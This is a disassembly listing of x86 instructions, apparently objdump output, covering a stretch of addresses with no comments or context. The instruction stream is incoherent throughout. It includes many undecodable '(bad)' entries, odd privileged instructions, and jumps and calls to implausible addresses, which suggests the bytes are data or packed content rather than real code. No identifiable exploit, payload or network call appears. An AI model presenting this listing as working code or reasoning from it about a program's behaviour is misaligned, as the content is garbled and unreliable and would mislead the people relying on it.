  431cd2:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431cd9:	jne    0x431ca2
  431cdb:	mov    ebp,esp
  431cdd:	fcomp  DWORD PTR [ebx]
  431cdf:	add    BYTE PTR [ecx],al
  431ce1:	inc    DWORD PTR [ebp-0x75]
  431ce4:	(bad)  
  431ce5:	cld    
  431ce6:	add    al,0xce
  431ce8:	mov    ecx,edi
  431cea:	cld    
  431ceb:	inc    ebp
  431cec:	fidivr WORD PTR [ebx]
  431cee:	fbstp  TBYTE PTR [ebp-0x3e]
  431cf1:	mov    eax,DWORD PTR [eax]
  431cf3:	adc    BYTE PTR [ebx-0x3974038b],cl
  431cf9:	fadd   st,st(7)
  431cfb:	add    BYTE PTR [ebp-0x1],al
  431cfe:	mov    ecx,DWORD PTR [esp+edi*8]
  431d01:	inc    ebp
  431d02:	mov    bh,0xc7
  431d05:	loopne 0x431d4c
  431d07:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431d0d:	sbb    dh,BYTE PTR [ebx]
  431d0f:	pushf  
  431d10:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431d16:	mov    eax,edi
  431d18:	cwde   
  431d19:	inc    ebp
  431d1a:	inc    ebp
  431d1b:	jne    0x431ca8
  431d1d:	mov    esp,esp
  431d1f:	clc    
  431d20:	add    al,0x4d
  431d22:	mov    DWORD PTR [ebx],esi
  431d24:	or     al,0x33
  431d26:	inc    ebp
  431d27:	lea    ecx,[ebx-0x398d13fd]
  431d2d:	add    bh,al
  431d2f:	inc    ebp
  431d30:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431d37:	add    ebp,esp
  431d39:	shufps xmm1,xmm3,0xc7
  431d3d:	(bad)  
  431d3e:	jmp    0x74885867
  431d43:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431d49:	hlt    
  431d4a:	mov    ecx,DWORD PTR [edi]
  431d4c:	fadd   DWORD PTR [ebp+0x0]
  431d4f:	xor    ecx,DWORD PTR [edi]
  431d51:	add    ecx,ecx
  431d53:	cmp    edi,edi
  431d55:	pmuludq mm7,QWORD PTR [edx+0x50]
  431d59:	(bad)  
  431d5a:	jmp    0x431ce7
  431d5c:	mov    edi,esp
  431d5e:	or     al,0xc6
  431d60:	inc    ebp
  431d61:	(bad)  
  431d62:	mov    eax,DWORD PTR [ebp+0x10]
  431d65:	jne    0x431cf0
  431d67:	mov    eax,DWORD PTR [ecx]
  431d69:	clc    
  431d6a:	add    BYTE PTR [ebp-0x40],cl
  431d6d:	xor    edx,DWORD PTR [eax-0x73]
  431d70:	jne    0x431d73
  431d72:	push   DWORD PTR [edx+0x8]
  431d75:	add    BYTE PTR [ebp+0x45],al
  431d78:	mov    ebp,ecx
  431d7a:	cld    
  431d7b:	add    BYTE PTR [ebp+0x0],cl
  431d7e:	xor    eax,DWORD PTR [ebp+0x3]
  431d81:	mov    DWORD PTR [ebx],edi
  431d83:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431d89:	sub    eax,0x5d330e4d
  431d8e:	lea    esi,[ebx]
  431d90:	add    DWORD PTR [ebx],eax
  431d92:	jb     0x431d7d
  431d94:	add    BYTE PTR [eax],al
  431d96:	inc    ebp
  431d97:	add    bl,ch
  431d99:	inc    ebp
  431d9a:	mov    esi,DWORD PTR [ebx]
  431d9c:	or     al,0x3
  431d9e:	(bad)  
  431d9f:	mov    edi,eax
  431da1:	in     al,dx
  431da2:	scas   eax,DWORD PTR es:[edi]
  431da3:	inc    ebp
  431da4:	mov    esi,DWORD PTR [ebx]
  431da6:	in     al,0x3
  431da8:	add    al,0x89
  431daa:	mov    ecx,DWORD PTR [eax+edi*8]
  431dad:	dec    ebp
  431dae:	(bad)  
  431daf:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431db6:	mov    ecx,eax
  431db8:	cld    
  431db9:	push   es
  431dba:	dec    ebp
  431dbb:	add    al,0x33
  431dbd:	mov    DWORD PTR [ebx],eax
  431dbf:	in     al,dx
  431dc0:	cmp    DWORD PTR [ebp-0x67],eax
  431dc3:	mov    eax,DWORD PTR [ebp-0xba0068]
  431dc9:	mov    edx,DWORD PTR [ebp-0x4]
  431dcc:	mov    ecx,DWORD PTR [ebp-0x2c]
  431dcf:	xor    eax,DWORD PTR [ebp+0x3]
  431dd2:	cmp    DWORD PTR [ebx],0x8b32749a
  431dd8:	xor    edi,esp
  431dda:	jmp    0xff771b2c
  431ddf:	add    ecx,DWORD PTR [ebp-0x3f]
  431de2:	xor    ebx,DWORD PTR [edi]
  431de4:	add    eax,ecx
  431de6:	cmp    ebx,DWORD PTR [eax]
  431de8:	mov    ecx,DWORD PTR [ebp-0x4]
  431deb:	mov    ecx,DWORD PTR [eax]
  431ded:	adc    BYTE PTR [ebp-0x80],al
  431df0:	jmp    0x431df3
  431df2:	mov    eax,DWORD PTR [eax]
  431df4:	cld    
  431df5:	mov    bh,0xc6
  431df7:	push   ecx
  431df8:	(bad)  
  431df9:	jne    0x431e59
  431dfb:	dec    ecx
  431dfd:	or     BYTE PTR [ecx+ebx*1],cl
  431e00:	push   ebp
  431e01:	inc    ebp
  431e02:	in     al,dx
  431e03:	add    ebp,esp
  431e05:	or     bh,al
  431e07:	dec    ebp
  431e08:	cld    
  431e09:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431e0f:	xor    DWORD PTR [edx],0x2
  431e12:	pushf  
  431e13:	dec    DWORD PTR [ebx+0x45510cf4]
  431e19:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431e1f:	mov    edx,DWORD PTR [ecx+0xc]
  431e22:	xor    eax,esi
  431e24:	mov    edx,0xc172c7
  431e29:	inc    ebp
  431e2a:	mov    esi,DWORD PTR [ebp+0x8]
  431e2d:	mov    eax,edx
  431e2f:	call   0x84c7e524
  431e34:	add    DWORD PTR [ebx-0x76bace00],ebx
  431e3a:	mov    ebp,eax
  431e3c:	or     BYTE PTR [eax],dl
  431e3e:	jo     0x431e8d
  431e40:	push   edi
  431e41:	xor    esi,DWORD PTR [ebp+0x3]
  431e44:	(bad)  
  431e45:	pmulhuw mm0,mm1
  431e48:	test   DWORD PTR [ebp-0x8],ecx
  431e4b:	mov    DWORD PTR [ebp-0x67],eax
  431e4e:	mov    eax,DWORD PTR [ebp-0x4]
  431e51:	xor    edi,DWORD PTR [ebp-0x73]
  431e54:	xor    eax,DWORD PTR [ebx]
  431e56:	xor    esi,DWORD PTR [edx+0x3]
  431e59:	add    BYTE PTR [ecx],bh
  431e5b:	inc    ebp
  431e5c:	(bad)  
  431e5d:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431e63:	mov    DWORD PTR [eax],0x750f0004
  431e69:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431e6f:	lock add BYTE PTR [ebp+0x0],cl
  431e73:	mov    esi,DWORD PTR [ebp-0x18]
  431e76:	mov    ebp,edx
  431e78:	or     al,0x72
  431e7a:	ja     0x431e7c
  431e7c:	mov    edx,esi
  431e7e:	cld    
  431e7f:	(bad)  
  431e82:	cli    
  431e83:	mov    esi,DWORD PTR [ebp-0x4]
  431e86:	cmp    ecx,esi
  431e88:	bswap  edi
  431e8a:	(bad)
  431e8e:	mov    esi,DWORD PTR [ebp-0x4]
  431e91:	mov    esi,ecx
  431e93:	clc    
  431e94:	repnz add esi,DWORD PTR [ebp+0x45]
  431e98:	push   ebx
  431e99:	xor    eax,DWORD PTR [ebp+0x3]
  431e9c:	cmp    al,0x5f
  431e9e:	pushf  
  431e9f:	pop    ebx
  431ea0:	jmp    0x431f67
  431ea5:	mov    esi,DWORD PTR [ebp-0x7d]
  431ea8:	xor    ebp,DWORD PTR [eax]
  431eaa:	lea    eax,[ebp-0x8]
  431ead:	xor    edx,esi
  431eaf:	pushf  
  431eb0:	out    dx,eax
  431eb1:	(bad)  
  431eb2:	neg    eax
  431eb4:	ins    DWORD PTR es:[edi],dx
  431eb5:	test   esi,edi
  431eb7:	clc    
  431eb8:	pop    esp
  431eb9:	inc    ebp
  431eba:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431ec0:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431ec6:	add    cl,al
  431ec8:	jne    0x431e65
  431eca:	mov    esi,DWORD PTR [edx]
  431ecc:	in     al,dx
  431ecd:	push   esi
  431ece:	xor    BYTE PTR [ebp-0xe],dh
  431ed1:	add    edi,esi
  431ed3:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431ed9:	add    cl,bh
  431edb:	mov    edi,DWORD PTR [ebp+0x8]
  431ede:	mov    DWORD PTR [ebp-0x14],esi
  431ee1:	add    esi,DWORD PTR [ebp+0x3c]
  431ee4:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431eea:	mov    ah,0x3e
  431eec:	fwait
  431eed:	pushf  
  431eee:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431ef4:	jne    0x431e81
  431ef6:	mov    ecx,DWORD PTR [esp+ebp*8]
  431ef9:	icebp  
  431efa:	icebp  
  431efb:	shl    edx,0xf2
  431efe:	(bad)  
  431eff:	mov    ah,0x16
  431f01:	push   eax
  431f02:	jne    0x431e97
  431f04:	mov    ecx,DWORD PTR [edi]
  431f06:	in     al,dx
  431f07:	jmp    0x431efa
  431f09:	add    dl,dh
  431f0b:	mov    edi,esi
  431f0d:	or     al,0x8
  431f0f:	inc    ebp
  431f10:	jne    0x431f15
  431f12:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431f18:	ret    
  431f19:	or     bh,bh
  431f1b:	jge    0x431f05
  431f1d:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431f23:	xor    edi,eax
  431f25:	add    esi,DWORD PTR [ebp-0x77]
  431f28:	mov    ebx,esp
  431f2a:	clc    
  431f2b:	neg    DWORD PTR [ebp-0x7c]
  431f2e:	xor    eax,DWORD PTR [eax]
  431f30:	cmp    eax,DWORD PTR [eax]
  431f32:	repz jne 0x431eca
  431f35:	xor    eax,DWORD PTR [ecx]
  431f37:	add    ebx,DWORD PTR [eax]
  431f39:	mov    DWORD PTR [ebp-0x8],eax
  431f3c:	mov    eax,edi
  431f3e:	cld    
  431f3f:	lock pop eax
  431f41:	test   DWORD PTR [ebx],esi
  431f43:	clc    
  431f44:	add    edx,DWORD PTR [edi-0x740bff77]
  431f4a:	fdivp  st(4),st
  431f4c:	test   ecx,esi
  431f4e:	(bad)  
  431f4f:	jnp    0x431f50
  431f51:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431f57:	jae    0x431ee4
  431f59:	sub    edi,esp
  431f5b:	(bad)  
  431f5c:	shl    DWORD PTR [eax-0x3e],0x89
  431f60:	leave  
  431f61:	call   0x8198d66e
  431f66:	in     al,dx
  431f67:	(bad)  
  431f68:	in     al,dx
  431f69:	add    bh,al
  431f6b:	mov    esp,edi
  431f6d:	in     al,dx
  431f6e:	test   DWORD PTR [ebp-0x8],edi
  431f71:	mov    eax,DWORD PTR [ebp+0x2b]
  431f74:	xor    al,BYTE PTR [ebx]
  431f76:	pushf  
  431f77:	jnp    0x57321bb0
  431f7d:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431f81:	loopne 0x431fb6
  431f83:	jne    0x431f40
  431f85:	mov    esi,DWORD PTR [edx-0x20]
  431f88:	add    BYTE PTR [ebp-0x3d],bh
  431f8b:	xor    eax,DWORD PTR [ebp-0x73]
  431f8e:	mov    edi,DWORD PTR [esi]
  431f90:	cld    
  431f91:	jb     0x431f59
  431f93:	add    bl,al
  431f95:	jne    0x431fdc
  431f97:	mov    edx,DWORD PTR [edi-0x10]
  431f9a:	jge    0x432019
  431f9c:	mov    esi,DWORD PTR [ebx]
  431f9e:	lock add ecx,DWORD PTR [ebp+0x3b]
  431fa2:	xor    esi,DWORD PTR [ebp-0x77]
  431fa5:	mov    esi,eax
  431fa7:	lock inc ebp
  431fa9:	jge    0x431fdc
  431fab:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431fb2:	dec    ebp
  431fb3:	mov    esi,DWORD PTR [ebx]
  431fb5:	loopne 0x431f40
  431fb7:	jge    0x431fb1
  431fb9:	add    DWORD PTR [ebp-0x7d],eax
  431fbc:	icebp  
  431fbd:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431fc4:	dec    ebp
  431fc5:	hlt    
  431fc6:	xor    ebx,DWORD PTR [ebp-0x77]
  431fc9:	mov    esi,esp
  431fcb:	in     al,0x45
  431fcd:	jge    0x43200c
  431fcf:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431fd6:	dec    ebp
  431fd7:	push   esp
  431fd8:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431fde:	inc    ebp
  431fdf:	hlt    
  431fe0:	xor    DWORD PTR [ebp-0x61],esi
  431fe3:	mov    edi,DWORD PTR [eax+0xf19504]
  431fe9:	repnz mov DWORD PTR [ebp+0x20],ebx
  431fed:	cmp    eax,DWORD PTR [ebp+0xf]
  431ff0:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431ff4:	fistp  WORD PTR [ebx+0x0]
  431ff7:	inc    ebp
  431ff8:	mov    ebx,DWORD PTR [edi+0xc]
  431ffb:	add    eax,eax
  431ffd:	inc    ebp
  431ffe:	test   BYTE PTR [ebx],dh
  432000:	add    eax,DWORD PTR [ebx]
  432002:	add    BYTE PTR [esi+0x45],bl
  432005:	ret    0x85
  432008:	jnp    0x5443a3d7
  43200e:	inc    bp
  432010:	inc    ebp
  432011:	xor    DWORD PTR [ecx+0xc78a9c],edi
  432017:	fdiv   QWORD PTR [ebx]
  432019:	test   DWORD PTR [ecx+0x453bf8],edi
  43201f:	push   ebx
  432020:	add    edi,DWORD PTR [esi+0x708088b]
  432026:	cmp    esi,eax
  432028:	setnp  BYTE PTR [ecx-0x74fcffce]
  43202f:	mov    esp,edi
  432031:	call   0x33ce6583
  432036:	or     BYTE PTR [ebx],al
  432038:	inc    ecx
  432039:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  43203f:	and    BYTE PTR [ebp-0x7074f0bb],al
  432045:	lock add cl,al
  432048:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  43204f:	mov    ch,0x45
  432051:	clc    
  432052:	xor    eax,DWORD PTR [ebp+0x3]
  432055:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  43205b:	inc    ebp
  43205c:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  432062:	mov    edi,eax
  432064:	mov    eax,DWORD PTR [ebp+0x3c]
  432067:	mov    ecx,DWORD PTR [eax]
  432069:	hlt    
  43206a:	inc    ebp
  43206b:	ror    DWORD PTR [ebx+0x818c45],0xf4
  432072:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  432078:	push   ebp
  432079:	mov    edi,DWORD PTR [ebx]
  43207b:	in     al,dx
  43207c:	jne    0x43203f
  43207e:	mov    eax,DWORD PTR [ebp-0x28]
  432081:	add    DWORD PTR [eax],0xe8058dec
  432087:	clc    
  432088:	mov    esi,DWORD PTR [edi-0x8]
  43208b:	add    dh,dl
  43208d:	rol    WORD PTR [ebp-0x1],cl
  432091:	mov    edx,DWORD PTR [eax+0x8]
  432094:	jne    0x432056
  432096:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  43209d:	inc    ebp
  43209e:	push   esp
  43209f:	test   DWORD PTR [ecx+0xf],ecx
  4320a2:	sub    edx,esp
  4320a4:	add    eax,DWORD PTR [eax]
  4320a6:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  4320ac:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  4320b3:	mov    eax,DWORD PTR [ecx]
  4320b5:	and    BYTE PTR [eax],al
  4320b7:	cmp    al,0x10
  4320b9:	add    BYTE PTR [ebp+0x66],al
  4320bc:	inc    ecx
  4320be:	push   esp
  4320bf:	add    dh,BYTE PTR [ebp+0x0]
  4320c2:	push   edx
  4320c3:	enterw 0xc1,0x4d
  4320c8:	mov    esp,DWORD PTR [esi+0x20]
  4320cb:	add    DWORD PTR [ecx-0x7b],eax
  4320ce:	add    eax,DWORD PTR [ebx]
  4320d0:	str    WORD PTR [eax+0x45]
  4320d4:	lea    ecx,[ebx+0x45890801]
  4320da:	sbb    BYTE PTR [ebx],al
  4320dc:	dec    ebp
  4320dd:	cmp    al,0xf
  4320df:	inc    ebp
  4320e0:	push   eax
  4320e1:	mov    esi,DWORD PTR [ebx]
  4320e3:	push   eax
  4320e4:	add    eax,eax
  4320e6:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  4320ed:	inc    ebp
  4320ee:	add    BYTE PTR [ecx],dh
  4320f0:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  4320f7:	(bad)  
  4320f8:	mov    ebx,eax
  4320fa:	loopne 0x432141
  4320fc:	dec    ebp
  4320fd:	mov    ecx,DWORD PTR [edi]
  4320ff:	cld    
  432100:	push   eax
  432101:	xchg   DWORD PTR [ebx],esi
  432103:	add    DWORD PTR [ebx],ebp
  432105:	add    BYTE PTR [ebx],ch
  432107:	or     BYTE PTR [ecx],bh
  432109:	dec    ecx
  43210a:	loopne 0x43210f
  43210c:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  432112:	push   ebp
  432113:	add    DWORD PTR [ebx+0x55100800],eax
  432119:	dec    ebp
  43211a:	jmp    0x4320a5
  43211c:	mov    esp,DWORD PTR [eax]
  43211e:	sbb    dl,dl
  432120:	inc    eax
  432121:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432127:	add    BYTE PTR [ebx+0x74528555],cl
  43212d:	push   ebp
  43212e:	div    DWORD PTR [ebx]
  432130:	and    eax,DWORD PTR [ebx]
  432132:	add    edx,DWORD PTR [edx-0x30]
  432135:	jno    0x4320c2
  432137:	inc    DWORD PTR [eax+eiz*1]
  43213a:	inc    ebp
  43213b:	push   eax
  43213c:	push   eax
  43213d:	mov    esp,DWORD PTR [edi-0x74beff1c]
  432143:	mov    edi,esp
  432145:	push   eax
  432146:	inc    ebp
  432147:	enter  0x458b,0x8
  43214b:	push   ecx
  43214c:	(bad)  
  43214d:	call   0x10d2b25
  432152:	pop    ss
  432153:	push   ebp
  432154:	mov    ecx,DWORD PTR [ebx+0x489408]
  43215a:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  432160:	push   ecx
  432161:	jo     0x43214b
  432163:	inc    DWORD PTR [edi]
  432165:	or     BYTE PTR [eax],al
  432167:	call   0xce28b1
  43216c:	fmul   QWORD PTR [ebp+0x55]
  43216f:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  432175:	mov    bh,0x8c
  432177:	adc    al,0x9b
  432179:	dec    esp
  43217a:	xor    bl,BYTE PTR [eax]
  43217c:	mov    ecx,DWORD PTR [ebp+0xc]
  43217f:	mov    eax,DWORD PTR [ebp-0x4]
  432182:	mov    esi,DWORD PTR [edi-0x3148f924]
  432188:	push   es
  432189:	retf   
  43218a:	mov    BYTE PTR [ebp-0x30],0x3b
  43218e:	inc    ebp
  43218f:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  432196:	retf   0x83fc
  432199:	into   
  43219a:	dec    ebp
  43219b:	retf   
  43219c:	mov    ecx,DWORD PTR [ebp-0x74]
  43219f:	mov    eax,DWORD PTR [eax]
  4321a1:	fdiv   QWORD PTR [ebx]
  4321a3:	mov    bh,0x3
  4321a5:	push   es
  4321a6:	mov    esi,ecx
  4321a8:	sbb    cl,dl
  4321aa:	dec    ebp
  4321ab:	sar    DWORD PTR [ebx],cl
  4321ad:	push   ebp
  4321ae:	jne    0x4321bf
  4321b0:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4321b6:	lea    ebx,[eax]
  4321b8:	call   0xf4ccad7f
  4321bd:	sbb    dh,dl
  4321bf:	add    edx,ebx
  4321c1:	push   ebp
  4321c2:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  4321c8:	push   ecx
  4321c9:	mov    DWORD PTR [eax-0x30],edx
  4321cc:	test   DWORD PTR [edx],eax
  4321ce:	xadd   esp,esi
  4321d1:	pop    es
  4321d2:	add    cl,dl
  4321d4:	mov    eax,ecx
  4321d6:	or     al,0x45
  4321d8:	(bad)  
  4321d9:	push   eax
  4321da:	add    DWORD PTR [edx+0x0],eax
  4321dd:	add    ecx,DWORD PTR [ecx]
  4321df:	and    dh,cl
  4321e1:	call   0xc72ab1
  4321e6:	add    DWORD PTR [ebp+0x0],edx
  4321e9:	mov    esp,DWORD PTR [ebp+0x18]
  4321ec:	add    BYTE PTR [eax+0x50],cl
  4321ef:	xor    eax,DWORD PTR [eax]
  4321f1:	add    esp,DWORD PTR [esi+0x3b]
  4321f4:	inc    ebp
  4321f5:	je     0x43217a
  4321f7:	push   ecx
  4321f8:	dec    BYTE PTR [ebp-0x77]
  4321fb:	add    eax,esi
  4321fd:	or     al,0x5e
  4321ff:	inc    eax
  432200:	add    BYTE PTR [ebx],al
  432202:	data16 and BYTE PTR [ebp+0x50],al
  432206:	sub    DWORD PTR [ecx],0xfffffff8
  432209:	add    BYTE PTR [ebp-0x75],ah
  43220c:	add    BYTE PTR [eax],bl
  43220e:	enter  0x894d,0x8b
  432212:	int3   
  432213:	loopne 0x4321d7
  432215:	rol    BYTE PTR [eax],0x33
  432218:	lea    cx,[ebp+0xa]
  43221c:	data16 jb 0x432264
  43221f:	add    BYTE PTR [ebx+0x44890855],cl
  432225:	sbb    ah,al
  432227:	inc    ebp
  432228:	cmp    al,0xf
  43222a:	add    BYTE PTR [edx+0x66],dl
  43222d:	xor    ecx,DWORD PTR [eax]
  43222f:	sub    eax,DWORD PTR [edx]
  432231:	mov    eax,DWORD PTR [eax]
  432233:	or     al,0x66
  432235:	ror    edx,cl
  432237:	dec    ebp
  432238:	inc    ebp
  432239:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43223f:	cld    
  432240:	or     BYTE PTR [edi+0x4501dd],dl
  432246:	ret    0xecce
  432249:	retf   
  43224a:	(bad)  
  43224b:	dec    ebp
  43224c:	mov    al,0x8b
  43224e:	loopne 0x432270
  432250:	cmp    ecx,DWORD PTR [edx]
  432252:	inc    ebp
  432253:	daa    
  432254:	loopne 0x4321dd
  432256:	in     al,dx
  432257:	add    edi,eax
  432259:	add    BYTE PTR [eax+0x3f52e155],bh
  43225f:	push   ebp
  432260:	inc    ebp
  432261:	xor    ebx,edx
  432263:	add    ebp,esp
  432265:	push   edx
  432266:	push   bp
  432268:	inc    ebp
  432269:	(bad)  
  43226a:	in     eax,dx
  43226b:	push   esp
  43226c:	(bad)  
  43226d:	inc    edx
  43226f:	sbb    al,0x33
  432271:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  432278:	add    BYTE PTR [ebp+0x46],0x8b
  43227c:	jmp    0xf98b:0x100041c8
  432283:	xor    esi,DWORD PTR [edx+0x3]
  432286:	mov    ecx,DWORD PTR [edi]
  432288:	fmul   DWORD PTR [edx]
  43228a:	add    BYTE PTR [eax],al
  43228c:	lea    eax,[ebx-0x4700273c]
  432292:	add    al,0x4f
  432294:	pop    DWORD PTR [eax]
  432296:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  43229c:	push   edx
  43229d:	inc    WORD PTR [ebp+0x8]
  4322a1:	mov    eax,0x514f4d
  4322a6:	(bad)
  4322aa:	add    al,al
  4322ac:	xor    DWORD PTR [ebx-0x74baf730],eax
  4322b2:	test   DWORD PTR [esi+0x74],esp
  4322b5:	inc    ebp
  4322b6:	mov    DWORD PTR [eax+0xa4e08],edi
  4322bc:	add    BYTE PTR [ecx-0x76c435bb],cl
  4322c2:	or     dh,cl
  4322c4:	or     eax,0x8b8d5045
  4322c9:	inc    ebp
  4322ca:	mov    WORD PTR [ecx+0x3b8a00],?
  4322d0:	jne    0x432305
  4322d2:	mov    edi,DWORD PTR [edx+0x8f3b18]
  4322d8:	add    DWORD PTR [ebx],eax
  4322da:	add    bh,bh
  4322dc:	adc    DWORD PTR [eax],ecx
  4322de:	adc    DWORD PTR [ebp+0x55],edi
  4322e1:	push   es
  4322e2:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  4322e8:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  4322ef:	inc    ebp
  4322f0:	mov    esp,edi
  4322f2:	or     al,0xda
  4322f4:	push   eax
  4322f5:	(bad)  
  4322f6:	jne    0x4322ac
  4322f8:	call   0x3b1be7
  4322fd:	inc    ebp
  4322fe:	sar    BYTE PTR [eax],0x84
  432301:	in     al,dx
  432302:	add    bh,al
  432304:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  43230b:	(bad)  
  43230c:	and    al,al
  43230e:	fs in  eax,dx
  432310:	inc    DWORD PTR [ebp-0x7b]
  432313:	jle    0x432324
  432315:	leave  
  432316:	scas   al,BYTE PTR es:[edi]
  432317:	inc    esp
  432318:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43231f:	or     BYTE PTR [ebx-0x97717c8],0x83
  432326:	call   DWORD PTR [edi]
  432328:	shr    ah,0x84
  43232b:	xchg   DWORD PTR [eax],eax
  43232d:	add    DWORD PTR [eax],eax
  43232f:	add    bh,bh
  432331:	dec    ebp
  432332:	and    BYTE PTR [ecx-0x38],dl
  432335:	push   eax
  432336:	dec    DWORD PTR [ebx+0xfd885]
  43233c:	mov    BYTE PTR [ebp+0x508bac00],cl
  432342:	mov    WORD PTR [ecx+0x0],ss
  432345:	lea    ecx,[ebx+0x108b20d8]
  43234b:	mov    WORD PTR [edx],ds
  43234d:	add    BYTE PTR [edi+0xff01ff],al
  432353:	mov    ecx,DWORD PTR [ebp-0x28]
  432356:	push   ecx
  432357:	shl    BYTE PTR [ebp+0x3a],0x8b
  43235b:	inc    ebp
  43235c:	in     al,0xeb
  43235e:	jno    0x4322eb
  432360:	push   edx
  432361:	mov    DWORD PTR [eax-0x28],edx
  432364:	mov    eax,DWORD PTR [ebp+0x20]
  432367:	je     0x4322f0
  432369:	mov    eax,DWORD PTR [ecx]
  43236b:	sbb    BYTE PTR [eax],al
  43236d:	pop    DWORD PTR [eax]
  43236f:	add    esi,eax
  432371:	add    bl,al
  432373:	adc    DWORD PTR [edi],esi
  432375:	jmp    0x8bce73c7
  43237a:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  432381:	jne    0x43230e
  432383:	mov    ecx,DWORD PTR [eax]
  432385:	in     al,0x75
  432387:	pop    DWORD PTR [ecx+0x5401]
  43238d:	push   edx
  43238e:	inc    DWORD PTR [ebx]
  432390:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432396:	add    BYTE PTR [edi+0x9],dl
  432399:	call   DWORD PTR [esi]
  43239b:	and    dl,al
  43239d:	and    bh,bh
  43239f:	inc    edi
  4323a1:	test   eax,edx
  4323a3:	sldt   ebx
  4323a6:	xor    al,BYTE PTR [eax]
  4323a8:	pushf  
  4323a9:	(bad)  
  4323aa:	jmp    0x4323b8
  4323ac:	mov    eax,edi
  4323ae:	or     al,0x75
  4323b0:	inc    eax
  4323b1:	call   0x431ab9
  4323b6:	mov    eax,eax
  4323b8:	loopne 0x43233e
  4323ba:	inc    ebp
  4323bb:	add    BYTE PTR [ebx+0x1451c00],cl
  4323c1:	mov    eax,DWORD PTR [ebp+0x20]
  4323c4:	add    edi,ecx
  4323c6:	add    BYTE PTR [eax],ch
  4323c8:	cmp    edi,0x18
  4323cb:	test   DWORD PTR [ebp+0xf],esi
  4323ce:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4323d5:	jne    0x4323d9
  4323d7:	call   0xffa21e9c
  4323dc:	leave  
  4323dd:	rcr    BYTE PTR [esp+eax*4],0x55
  4323e1:	add    ah,ch
  4323e3:	add    BYTE PTR [edi-0x48fef979],dh
  4323e9:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  4323f0:	inc    esp
  4323f1:	mov    ebx,DWORD PTR [eax]
  4323f3:	fcom   st(2)
  4323f5:	add    BYTE PTR [edi],bl
  4323f7:	lea    ecx,[eax-0x18]
  4323fa:	(bad)  
  4323fb:	push   DWORD PTR [ecx]
  4323fd:	call   0xffb5715f
  432402:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  432406:	fstp   DWORD PTR [esi+ebx*8]
  432409:	push   ebp
  43240a:	pop    ebp
  43240b:	mov    esi,DWORD PTR [edx-0x38]
  43240e:	add    DWORD PTR [eax],0x28
  432411:	mov    edi,DWORD PTR [ebx]
  432413:	xor    esi,DWORD PTR [edx+0x3]
  432416:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  43241a:	pop    ebp
  43241b:	or     al,0x4
  43241d:	inc    ecx
  43241e:	push   ebp
  43241f:	(bad)  
  432420:	in     al,dx
  432421:	or     ah,ch
  432423:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432424:	xbegin 0xffc89a1a
  43242a:	clc    
  43242b:	adc    al,0x45
  43242d:	div    BYTE PTR [edx]
  43242f:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  432436:	test   DWORD PTR [ebx+0x666300f8],ebx
  43243c:	add    BYTE PTR [ecx+0x66],dh
  43243f:	add    eax,DWORD PTR [ebp+0x52]
  432442:	adc    eax,0xffffffa0
  432445:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  43244b:	test   DWORD PTR [eax],eax
  43244d:	clc    
  43244e:	data16 or al,BYTE PTR [ebp+0x45]
  432452:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432459:	rol    BYTE PTR [ebp+0x45],1
  43245c:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  432462:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432468:	push   ebx
  432469:	add    BYTE PTR [eax+eax*1+0x51],dl
  43246d:	jge    0x4324a2
